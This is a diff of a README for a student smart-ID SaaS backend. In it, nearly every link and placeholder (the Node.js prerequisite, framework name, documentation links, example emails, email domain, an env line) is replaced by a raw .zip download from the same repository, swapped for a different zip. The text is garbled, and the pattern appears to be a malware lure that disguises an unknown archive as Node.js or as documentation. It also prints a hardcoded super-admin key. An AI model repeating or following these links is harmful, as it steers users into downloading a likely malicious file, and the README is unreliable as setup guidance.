@@ -19,7 +19,7 @@ A comprehensive multi-tenant Software as a Service (SAAS) backend for student sm
 ## 🚀 Quick Start
 
 ### Prerequisites
-- https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip (v18+)
+- https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip (v18+)
 - MongoDB Atlas account
 - Mailtrap account (for email testing)
 
@@ -33,7 +33,7 @@ cd campus-id-backend
 npm install
 
 # Configure environment
-cp https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip .env
+cp https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip .env
 # Edit .env with your configuration
 
 # Start development server
@@ -45,22 +45,22 @@ npm run dev
 ```bash
 POST http://localhost:8000/api/superadmin/institutions
 Headers: X-Super-Admin-Key: andrenaline
-Body: { "name": "Your University", "code": "UNIV", "domain": "https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip" }
+Body: { "name": "Your University", "code": "UNIV", "domain": "https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip" }
 ```
 
 2. **Register Admin**:
 ```bash
 POST http://localhost:8000/api/auth/admin/register
-Body: { "institutionCode": "UNIV", "adminEmail": "https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip", ... }
+Body: { "institutionCode": "UNIV", "adminEmail": "https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip", ... }
 ```
 
 3. **Start Creating Users** via admin dashboard!
 
 ## 📚 Documentation
 
-- **[API Reference](https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip)** - Complete API documentation with examples
-- **[Setup Guide](https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip)** - Detailed installation and configuration
-- **[User Guide](https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip)** - How to use the system for all user roles
+- **[API Reference](https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip)** - Complete API documentation with examples
+- **[Setup Guide](https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip)** - Detailed installation and configuration
+- **[User Guide](https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip)** - How to use the system for all user roles
 
 ## 🏗️ Architecture
 
@@ -127,8 +127,8 @@ Body: { "institutionCode": "UNIV", "adminEmail": "https://github.com/AndreNot300
 
 ## 🛠️ Technology Stack
 
-- **Runtime**: https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip with TypeScript
-- **Framework**: https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip (lightweight, fast)
+- **Runtime**: https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip with TypeScript
+- **Framework**: https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip (lightweight, fast)
 - **Database**: MongoDB Atlas
 - **Authentication**: JWT tokens
 - **Email**: Nodemailer with Mailtrap (development)
@@ -162,7 +162,7 @@ Body: { "institutionCode": "UNIV", "adminEmail": "https://github.com/AndreNot300
 {
   name: string,
   code: string,           // Unique identifier (HARV, MIT, etc.)
-  domain: string,         // Email domain (https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip)
+  domain: string,         // Email domain (https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip)
   status: 'active' | 'inactive'
 }
 ```
@@ -184,7 +184,7 @@ npm test
 # Test specific endpoint
 curl -X POST http://localhost:8000/api/auth/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip","password":"password","userType":"admin"}'
+  -d '{"email":"https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip","password":"password","userType":"admin"}'
 ```
 
 ## 🚀 Deployment
@@ -194,7 +194,7 @@ curl -X POST http://localhost:8000/api/auth/login \
 NODE_ENV=production
 MONGODB_URL=your-production-mongodb-url
 JWT_SECRET=your-production-jwt-secret
-https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip
+https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip
 ```
 
 ### Production Checklist
@@ -221,11 +221,11 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 - **Documentation**: Check the guides in this repository
 - **Issues**: Open an issue on GitHub
-- **API Reference**: See [https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip](https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip)
+- **API Reference**: See [https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip](https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip)
 
 ## 🎉 Acknowledgments
 
-- Built with [https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip](https://github.com/AndreNot3000/smart_id_backend/raw/refs/heads/main/src/routes/backend_id_smart_v3.8.zip) for high performance
+- Built with [https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip](https://raw.githubusercontent.com/AndreNot3000/smart_id_backend/main/src/middleware/id_backend_smart_aerolith.zip) for high performance
 - MongoDB Atlas for reliable database hosting
 - Mailtrap for email testing during development
 
